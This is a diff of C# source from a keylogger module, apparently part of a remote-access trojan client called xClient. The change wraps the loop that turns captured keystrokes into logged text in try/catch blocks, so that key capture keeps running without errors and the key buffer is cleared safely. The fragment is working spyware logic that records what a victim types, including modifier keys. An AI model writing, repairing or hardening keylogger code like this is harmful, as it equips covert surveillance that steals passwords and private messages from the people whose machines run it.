@@ -132,29 +132,41 @@ namespace xClient.Core.Keylogger
 
             foreach (var k in _keyBuffer)
             {
-                //
-                if (k != null && !string.IsNullOrEmpty(k.PressedKey.GetKeyloggerKeyName()))
+                try
                 {
-                    if (k.PressedKey.IsSpecialKey())
+                    if (k != null && !string.IsNullOrEmpty(k.PressedKey.GetKeyloggerKeyName()))
                     {
-                        // TODO: Re-Write this portion with the portion for when the timer elapses.
+                        if (k.PressedKey.IsSpecialKey())
+                        {
+                            // TODO: Re-Write this portion with the portion for when the timer elapses.
 
-                        //_logFileBuffer.Append(
-                        //    HighlightSpecialKey(((k.ModifierKeys.ShiftKeyPressed) ? "SHIFT-" : string.Empty) +
-                        //    ((k.ModifierKeys.CtrlKeyPressed) ? "CTRL-" : string.Empty) +
-                        //    ((k.ModifierKeys.AltKeyPressed) ? "ALT-" : string.Empty) +
-                        //    ((k.ModifierKeys.ShiftKeyPressed) ? "ESC-" : string.Empty) +
-                        //    FromKeys(k.PressedKey.KeyloggerKeyName(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock)));
+                            //_logFileBuffer.Append(
+                            //    HighlightSpecialKey(((k.ModifierKeys.ShiftKeyPressed) ? "SHIFT-" : string.Empty) +
+                            //    ((k.ModifierKeys.CtrlKeyPressed) ? "CTRL-" : string.Empty) +
+                            //    ((k.ModifierKeys.AltKeyPressed) ? "ALT-" : string.Empty) +
+                            //    ((k.ModifierKeys.ShiftKeyPressed) ? "ESC-" : string.Empty) +
+                            //    FromKeys(k.PressedKey.KeyloggerKeyName(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock)));
+                        }
+                    }
+                    else
+                    {
+                        _logFileBuffer.Append(FromKeys(k.PressedKey.GetKeyloggerKeyValue(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock));
                     }
                 }
-                else
-                {
-                    _logFileBuffer.Append(FromKeys(k.PressedKey.GetKeyloggerKeyValue(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock));
-                }
+                catch
+                { }
             }
             j++;
+
             if (j > 0 && j <= _keyBuffer.Count)
-                _keyBuffer.RemoveRange(0, j);
+            {
+                try
+                {
+                    _keyBuffer.RemoveRange(0, j);
+                }
+                catch
+                { }
+            }
         }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
